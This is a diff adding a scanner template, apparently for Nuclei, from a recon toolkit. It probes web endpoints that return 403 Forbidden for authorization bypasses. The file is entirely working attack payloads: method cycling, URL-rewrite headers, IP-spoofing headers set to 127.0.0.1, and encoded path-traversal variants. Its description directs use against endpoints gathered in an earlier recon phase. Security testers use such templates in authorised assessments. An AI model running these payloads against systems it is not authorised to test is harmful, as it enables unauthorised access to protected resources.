@@ -1,0 +1,95 @@
+id: auth-bypass-403
+
+info:
+  name: 403 Bypass Techniques
+  author: wf-recon-toolkit
+  severity: medium
+  description: |
+    Tests various techniques to bypass 403 Forbidden responses.
+    Use this against endpoints that return 403 from Phase 2.
+    Valid bypass = potential auth bypass vulnerability.
+  tags: bypass,403,auth,misconfiguration
+  reference:
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
+
+requests:
+  # Method-based bypass
+  - raw:
+      - |
+        {{method}} {{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      method:
+        - "GET"
+        - "POST"
+        - "PUT"
+        - "PATCH"
+        - "DELETE"
+        - "OPTIONS"
+        - "TRACE"
+        - "HEAD"
+
+    attack: sniper
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
+        condition: or
+
+http:
+  # Header-based bypass
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      X-Original-URL: "{{path}}"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      X-Rewrite-URL: "{{path}}"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+      X-Real-IP: "127.0.0.1"
+      X-Originating-IP: "127.0.0.1"
+      X-Custom-IP-Authorization: "127.0.0.1"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  # Path traversal bypass
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/."
+      - "{{BaseURL}}//"
+      - "{{BaseURL}}/./"
+      - "{{BaseURL}}/..;/"
+      - "{{BaseURL}}/%2e/"
+      - "{{BaseURL}}/%252e/"
+      - "{{BaseURL}}/%ef%bc%8f"
+
+    matchers:
+      - type: status
+        status:
+          - 200
